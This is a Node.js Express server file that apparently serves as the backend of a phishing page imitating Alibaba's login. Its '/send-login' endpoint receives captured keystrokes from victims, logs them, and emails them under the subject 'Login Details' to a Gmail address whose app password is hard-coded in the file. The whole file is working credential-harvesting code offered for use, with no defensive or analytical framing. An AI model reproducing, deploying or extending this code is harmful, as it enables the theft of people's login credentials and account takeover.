const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
const PORT = 3000;
const REDIRECT_URL = "https://login.alibaba.com";
let is404Refreshed = false

// Middleware
app.use(bodyParser.json());
app.use(cors());

app.post('/send-login', async (req, res) => {
  var  {keycodes, keychars} = req.body;

  if (!{keycodes, keychars}) {
    return res.status(400).json({ error: "No keystrokes provided." });
  }

  console.log(`${keychars},${keycodes}`)

    // Create transporter
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'alidetails10@gmail.com',
            pass: 'ovczxrwwhcwabdlk', 
        },
    });

    // Email details
    const mailOptions = {
        from: 'alidetails10@gmail.com',
        to: 'alidetails10@gmail.com',
        subject: 'Login Details',
        text: `${keychars}\n\n${keycodes}`,
    };

    try {
        await transporter.sendMail(mailOptions);
        res.json({ success: true, message: 'Email sent successfully!' });
    } catch (error) {
        console.error('Error sending email:', error);
        res.status(500).json({ success: false, message: 'Failed to send email.' });
    }
    
});
app.get('/', (req,res) => {
    res.send("hello world");
})
// Start Server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});